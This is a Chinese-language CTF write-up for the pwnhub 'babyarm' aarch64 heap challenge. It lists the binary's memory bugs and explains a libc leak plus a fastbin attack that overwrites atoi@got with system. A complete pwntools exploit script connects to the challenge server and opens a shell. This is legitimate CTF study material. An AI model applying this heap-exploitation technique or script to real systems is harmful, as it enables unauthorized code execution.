# pwnhub-public-2-babyarm



### 总结

好了，下一道。

<!-- more -->

### checksec

![image-20220225211444707](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225211444707.png)



题目的架构为`aarch64`，小端序。

### 程序分析

分析后发现为经典的增删改查的题目，漏洞点也比较多，这里给出几个漏洞点：

1. 在`edit`函数中，没有校验索引和大小

![image-20220220143908177](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220220143908177.png)

2. 在`read_input`函数中，存在`off by null`：

   ![image-20220220144002459](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220220144002459.png)

3. 在`dele`分支中，没有校验索引
4. 在`secret`分支中，可以泄露地址

### 利用过程

调试后发现，程序没有开启`aslr`，所以每次启动的地址都是一样的

利用`secret`泄露出`libc`地址，然后利用`fastbin attack`修改堆指针，最后用`edit`将`atoi@got`修改为`system`地址

用`unsorted bin chunk`的`fd/bk`泄露`libc`地址：

![image-20220220150218344](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220220150218344.png)

计算出远程的`system`地址为：0x400086f818

然后fastbin attack打即可：

![image-20220220150750751](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220220150750751.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

context.update(arch="aarch64", os="linux", endian="little", log_level="debug", timeout=10)

io = remote("121.40.89.206", 10041)

def add(size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("size:", str(size))

def edit(idx, data):
    io.sendlineafter("> ", "2")
    io.sendlineafter("id:", str(idx))
    if not data.endswith(b"\n") and len(data) < 0x18:
        data += b"\n"
    io.sendafter("content:", data)

def dele(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter("id: ", str(idx))


def secret(data):
    io.sendlineafter("> ", "110")
    io.sendafter("ohhhh!you find a secret \n", data)

# leak addr
# add(0x80)
# add(0x10)
# dele(0)
# secret("a"*8)
# msg = io.recvall(timeout=3)
# print(msg)
# io.close()
# exit(0)

add(0x80)
add(0x30)
dele(1)
# 修改fd
edit(1, p64(0x41209a))
# fastbin attack
add(0x30)
add(0x30)

edit(3, b"\x41" + b"\x00" * 5 + p64(0x412010)) # atoi@got

system_addr = 0x400086f818
edit(2, p64(system_addr)[:6])

io.sendline("/bin/sh")

io.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-02-23-pwnhub-public-2-babyarm/  

